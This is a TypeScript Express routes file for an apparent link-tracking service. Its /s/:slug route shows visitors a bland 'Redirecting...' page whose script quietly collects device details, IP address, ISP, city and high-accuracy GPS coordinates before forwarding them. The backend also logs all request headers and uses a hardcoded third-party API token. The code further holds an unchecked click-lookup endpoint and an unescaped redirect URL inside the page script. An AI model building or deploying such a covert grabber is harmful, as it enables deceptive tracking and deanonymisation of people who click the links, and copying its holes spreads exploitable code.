import type { Express } from "express";
import { createServer, type Server } from "http";
import { setupAuth } from "./auth";
import { storage } from "./storage";
import { insertShortlinkSchema, insertClickEventSchema } from "@shared/schema";
import { nanoid } from "nanoid";

export function registerRoutes(app: Express): Server {
  setupAuth(app);

  // Create tracking shortlink
  app.post("/api/shortlinks", async (req, res, next) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "Authentication required" });
      }

      const validatedData = insertShortlinkSchema.parse({
        ...req.body,
        userId: req.user!.id,
        slug: nanoid(8),
      });

      const shortlink = await storage.createShortlink(validatedData);
      res.status(201).json(shortlink);
    } catch (error) {
      next(error);
    }
  });

  // Get user's shortlinks
  app.get("/api/shortlinks", async (req, res, next) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "Authentication required" });
      }

      const shortlinks = await storage.getShortlinksByUser(req.user!.id);
      res.json(shortlinks);
    } catch (error) {
      next(error);
    }
  });

  // Get shortlink click events
  app.get("/api/shortlinks/:id/clicks", async (req, res, next) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "Authentication required" });
      }

      const shortlinkId = parseInt(req.params.id);
      const clicks = await storage.getClickEventsByShortlink(shortlinkId);
      res.json(clicks);
    } catch (error) {
      next(error);
    }
  });

  // Get user's all click events
  app.get("/api/clicks", async (req, res, next) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "Authentication required" });
      }

      const clicks = await storage.getClickEventsByUser(req.user!.id);
      res.json(clicks);
    } catch (error) {
      next(error);
    }
  });

  // Tracking page route - captures metadata
  app.get("/s/:slug", async (req, res, next) => {
    try {
      const shortlink = await storage.getShortlinkBySlug(req.params.slug);
      
      if (!shortlink || !shortlink.isActive) {
        return res.status(404).send("Link not found");
      }

      // Serve tracking page that will capture metadata
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Redirecting...</title>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
          <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
            <h2>Redirecting...</h2>
            <p>Please wait while we redirect you...</p>
          </div>
          <script>
            (async function() {
              // Parse user agent for detailed info
              function parseUserAgent(ua) {
                const result = {
                  browser: 'Unknown',
                  os: 'Unknown',
                  deviceModel: 'Unknown',
                  deviceType: 'Unknown',
                  androidVersion: null
                };

                // Browser detection
                if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
                  const chromeMatch = ua.match(/Chrome\\/([\\d.]+)/);
                  result.browser = chromeMatch ? 'Chrome ' + chromeMatch[1] : 'Chrome';
                } else if (ua.includes('Firefox/')) {
                  const firefoxMatch = ua.match(/Firefox\\/([\\d.]+)/);
                  result.browser = firefoxMatch ? 'Firefox ' + firefoxMatch[1] : 'Firefox';
                } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
                  const safariMatch = ua.match(/Version\\/([\\d.]+)/);
                  result.browser = safariMatch ? 'Safari ' + safariMatch[1] : 'Safari';
                } else if (ua.includes('Edg/')) {
                  const edgeMatch = ua.match(/Edg\\/([\\d.]+)/);
                  result.browser = edgeMatch ? 'Edge ' + edgeMatch[1] : 'Edge';
                }

                // OS detection
                if (ua.includes('Windows NT')) {
                  const winMatch = ua.match(/Windows NT ([\\d.]+)/);
                  result.os = winMatch ? 'Windows ' + winMatch[1] : 'Windows';
                } else if (ua.includes('Mac OS X')) {
                  const macMatch = ua.match(/Mac OS X ([\\d_]+)/);
                  result.os = macMatch ? 'macOS ' + macMatch[1].replace(/_/g, '.') : 'macOS';
                } else if (ua.includes('Linux')) {
                  result.os = 'Linux';
                } else if (ua.includes('Android')) {
                  const androidMatch = ua.match(/Android ([\\d.]+)/);
                  result.os = androidMatch ? 'Android ' + androidMatch[1] : 'Android';
                  result.androidVersion = androidMatch ? androidMatch[1] : null;
                } else if (ua.includes('iPhone OS') || ua.includes('iOS')) {
                  const iosMatch = ua.match(/OS ([\\d_]+)/);
                  result.os = iosMatch ? 'iOS ' + iosMatch[1].replace(/_/g, '.') : 'iOS';
                }

                // Device detection
                if (ua.includes('Mobile') || ua.includes('Android')) {
                  result.deviceType = 'Mobile';
                } else if (ua.includes('Tablet') || ua.includes('iPad')) {
                  result.deviceType = 'Tablet';
                } else {
                  result.deviceType = 'Desktop';
                }

                // Device model for mobile
                if (ua.includes('Android')) {
                  const modelMatch = ua.match(/\\) ([^;]+);/);
                  if (modelMatch) {
                    result.deviceModel = modelMatch[1];
                  }
                } else if (ua.includes('iPhone')) {
                  result.deviceModel = 'iPhone';
                } else if (ua.includes('iPad')) {
                  result.deviceModel = 'iPad';
                }

                return result;
              }

              const userAgentInfo = parseUserAgent(navigator.userAgent);
              
              const data = {
                shortlinkId: ${shortlink.id},
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: screen.width + 'x' + screen.height,
                browser: userAgentInfo.browser,
                os: userAgentInfo.os,
                deviceModel: userAgentInfo.deviceModel,
                deviceType: userAgentInfo.deviceType,
                androidVersion: userAgentInfo.androidVersion,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
              };

              // Try to get IP and location info with enhanced data
              try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                data.ipAddress = ipData.ip;
                data.country = ipData.country_name;
                data.city = ipData.city;
                data.isp = ipData.org || ipData.isp;
              } catch (e) {
                console.log('Could not get IP info');
              }

              // Try to get precise geolocation
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  async (position) => {
                    data.latitude = position.coords.latitude;
                    data.longitude = position.coords.longitude;
                    await sendData(data);
                  },
                  async (error) => {
                    console.log('Geolocation denied or failed');
                    await sendData(data);
                  },
                  {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                  }
                );
              } else {
                await sendData(data);
              }

              async function sendData(data) {
                try {
                  await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                  });
                } catch (e) {
                  console.log('Tracking failed');
                }
                
                // Redirect to target URL
                window.location.href = '${shortlink.targetUrl}';
              }
            })();
          </script>
        </body>
        </html>
      `);
    } catch (error) {
      next(error);
    }
  });

  // Endpoint to get targetUrl and shortlinkId for a slug
  app.get("/api/shortlink-meta/:slug", async (req, res, next) => {
    try {
      const shortlink = await storage.getShortlinkBySlug(req.params.slug);
      if (!shortlink || !shortlink.isActive) {
        return res.status(404).json({ message: "Not found" });
      }
      res.json({ targetUrl: shortlink.targetUrl, shortlinkId: shortlink.id });
    } catch (error) {
      next(error);
    }
  });

  // Track click event
  app.post("/api/track", async (req, res, next) => {
    try {
      // Merge client data with backend IP geolocation
      const clientData = req.body;
      let ipInfo: Record<string, any> = {};
      try {
        // Use ipinfo.io for backend IP geolocation
        const ipHeader = req.headers["x-forwarded-for"];
        const ip = typeof ipHeader === 'string' ? ipHeader.split(",")[0] : req.connection.remoteAddress;
        console.log('Backend detected IP:', ip);
        console.log('All headers:', req.headers);
        const ipinfoRes = await fetch(`https://ipinfo.io/${ip}/json?token=5c85542fb1e53b`);
        if (ipinfoRes.ok) {
          ipInfo = await ipinfoRes.json();
        }
      } catch (e) {
        console.log("Could not get backend IP info");
      }
      const mergedData = {
        ...clientData,
        backendIp: ipInfo.ip,
        backendCountry: ipInfo.country,
        backendCity: ipInfo.city,
        backendRegion: ipInfo.region,
        backendLoc: ipInfo.loc,
        backendOrg: ipInfo.org,
        backendTimezone: ipInfo.timezone
      };
      const validatedData = insertClickEventSchema.parse(mergedData);
      const clickEvent = await storage.createClickEvent(validatedData);
      res.status(201).json({ success: true });
    } catch (error) {
      next(error);
    }
  });

  // Dashboard stats
  app.get("/api/stats", async (req, res, next) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "Authentication required" });
      }

      const shortlinks = await storage.getShortlinksByUser(req.user!.id);
      const clicks = await storage.getClickEventsByUser(req.user!.id);
      
      const activeLinks = shortlinks.filter(link => link.isActive).length;
      const totalClicks = clicks.length;
      
      res.json({
        totalLinks: shortlinks.length,
        activeLinks,
        totalClicks,
        threatScore: 'Medium' // This would be calculated based on actual threat intelligence
      });
    } catch (error) {
      next(error);
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
